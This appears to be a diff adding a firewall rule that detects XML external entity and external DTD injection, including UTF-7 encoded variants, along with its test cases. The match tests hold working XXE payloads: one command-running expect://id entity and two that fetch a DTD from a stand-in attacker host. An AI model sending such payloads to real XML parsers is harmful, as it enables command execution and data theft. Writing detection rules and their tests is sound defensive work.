@@ -1,0 +1,50 @@
+# Strata gap rule, W13-S-01: XML external entities and external DTDs
+# (GoTestWAF xml-injection and community-xxe, 15/10/2026), UTF-7 included.
+rule:
+  id: 300003
+  name: XML external entity or external DTD
+  layer: managed
+  stage: request_body
+  match:
+    all:
+    - targets: [ { var: request_body }, { var: args } ]
+      transforms: [ lowercase ]
+      operator:
+        type: rx
+        value: '<!doctype\s+[\w:.-]+\s+system\b|<!entity\s+(?:%\s*)?[\w.-]+\s+(?:system|public)\b|\+adwaiq-(?:doctype|entity)'
+  score: 100
+  action_mode: score
+  severity: critical
+  metadata:
+    source: strata
+    license: Apache-2.0
+    attack_type: xxe
+    accuracy: high
+    tags: [w13-s-01, gotestwaf]
+tests:
+  match:
+  - method: POST
+    uri: /v1/import
+    headers: { Host: api.example.test, Content-Type: application/xml }
+    body: '<!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>'
+  - method: POST
+    uri: /v1/import
+    headers: { Host: api.example.test, Content-Type: application/xml }
+    body: '<!DOCTYPE x SYSTEM "//x/x" > <x>a</x>'
+  - method: POST
+    uri: /v1/import
+    headers: { Host: api.example.test, Content-Type: application/xml }
+    body: '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE x [<!ENTITY % xxe PUBLIC "any_text" "http://attacker.example.test/evil.dtd">%xxe;]><root>&xxe;</root>'
+  - method: POST
+    uri: /v1/import
+    headers: { Host: api.example.test, Content-Type: application/xml }
+    body: "<?xml version=\"1.0\" encoding=\"UTF-7\"?>\n+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4\n+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://attacker.example.test+ACI +AD4AXQA+\n"
+  no_match:
+  - method: POST
+    uri: /v1/import
+    headers: { Host: api.example.test, Content-Type: application/xml }
+    body: '<?xml version="1.0"?><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"><order><id>7</id></order>'
+  - method: POST
+    uri: /v1/import
+    headers: { Host: api.example.test, Content-Type: application/xml }
+    body: '<?xml version="1.0"?><note><to>Ops</to><body>The system entity list is ready</body></note>'
